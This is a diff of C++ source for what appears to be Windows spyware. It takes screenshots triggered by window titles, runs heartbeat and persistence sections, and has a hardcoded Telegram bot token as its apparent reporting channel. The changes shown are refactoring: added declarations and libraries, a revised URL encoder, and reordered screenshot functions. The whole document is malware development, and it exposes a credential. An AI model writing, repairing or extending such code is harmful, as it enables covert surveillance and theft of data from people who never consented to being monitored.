@@ -23,8 +23,18 @@
 
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "ole32.lib")
+#pragma comment(lib, "oleaut32.lib")
 
 using namespace Gdiplus;
+
+// ==================== FUNCTION DECLARATIONS ====================
+bool TakeScreenshotNow(const std::wstring& title);
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
+bool TakeSmartScreenshot();
+void AsyncScreenshotWorker();
+void ScreenshotMonitorThread();
+void HeartbeatThread();
 
 // ==================== CONFIGURATION ====================
 const char* BOT_TOKEN_ANSI = "7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
@@ -73,19 +83,20 @@ std::string WStringToUTF8(const std::wstring& wstr) {
     return str;
 }
 
-// ==================== URL ENCODING ====================
+// ==================== FIXED URL ENCODING ====================
 std::string URLEncode(const std::string& value) {
     std::ostringstream escaped;
     escaped.fill('0');
     escaped << std::hex;
     
-    for (char c : value) {
-        if (isalnum((unsigned char)c) || c == '-' || c == '_' || c == '.' || c == '~' || c == ' ' || c == '\n') {
+    for (size_t i = 0; i < value.length(); ++i) {
+        unsigned char c = value[i];
+        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~' || c == ' ' || c == '\n') {
             if (c == ' ') escaped << '+';
             else if (c == '\n') escaped << "%0A";
             else escaped << c;
         } else {
-            escaped << '%' << std::setw(2) << int((unsigned char)c);
+            escaped << '%' << std::setw(2) << static_cast<int>(c);
         }
     }
     return escaped.str();
@@ -480,32 +491,27 @@ bool ShouldTakeScreenshot(const std::wstring& windowTitle) {
     return true;
 }
 
-// ==================== ASYNC SCREENSHOT WORKER ====================
-void AsyncScreenshotWorker() {
-    while (g_running) {
-        std::wstring title;
-        
-        {
-            std::unique_lock<std::mutex> lock(g_queueMutex);
-            // Wait for a screenshot request
-            g_queueCV.wait(lock, [] { return !g_screenshotQueue.empty() || !g_running; });
-            
-            if (!g_running) break;
-            
-            if (!g_screenshotQueue.empty()) {
-                title = g_screenshotQueue.front();
-                g_screenshotQueue.pop();
-            }
-        }
-        
-        if (!title.empty()) {
-            // Add small delay
-            std::this_thread::sleep_for(std::chrono::milliseconds(300));
-            
-            // Take the actual screenshot
-            TakeScreenshotNow(title);
+// ==================== ENCODER UTILITY ====================
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    UINT num = 0, size = 0;
+    GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+    
+    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc(size);
+    if (!pImageCodecInfo) return -1;
+    
+    GetImageEncoders(num, size, pImageCodecInfo);
+    
+    for (UINT j = 0; j < num; ++j) {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
         }
     }
+    
+    free(pImageCodecInfo);
+    return -1;
 }
 
 // ==================== ACTUAL SCREENSHOT FUNCTION ====================
@@ -606,27 +612,32 @@ bool TakeSmartScreenshot() {
     return true;
 }
 
-// ==================== ENCODER UTILITY ====================
-int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
-    UINT num = 0, size = 0;
-    GetImageEncodersSize(&num, &size);
-    if (size == 0) return -1;
-    
-    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)malloc(size);
-    if (!pImageCodecInfo) return -1;
-    
-    GetImageEncoders(num, size, pImageCodecInfo);
-    
-    for (UINT j = 0; j < num; ++j) {
-        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
-            *pClsid = pImageCodecInfo[j].Clsid;
-            free(pImageCodecInfo);
-            return j;
+// ==================== ASYNC SCREENSHOT WORKER ====================
+void AsyncScreenshotWorker() {
+    while (g_running) {
+        std::wstring title;
+        
+        {
+            std::unique_lock<std::mutex> lock(g_queueMutex);
+            // Wait for a screenshot request
+            g_queueCV.wait(lock, [] { return !g_screenshotQueue.empty() || !g_running; });
+            
+            if (!g_running) break;
+            
+            if (!g_screenshotQueue.empty()) {
+                title = g_screenshotQueue.front();
+                g_screenshotQueue.pop();
+            }
+        }
+        
+        if (!title.empty()) {
+            // Add small delay
+            std::this_thread::sleep_for(std::chrono::milliseconds(300));
+            
+            // Take the actual screenshot
+            TakeScreenshotNow(title);
         }
     }
-    
-    free(pImageCodecInfo);
-    return -1;
 }
 
 // ==================== PERSISTENCE ====================
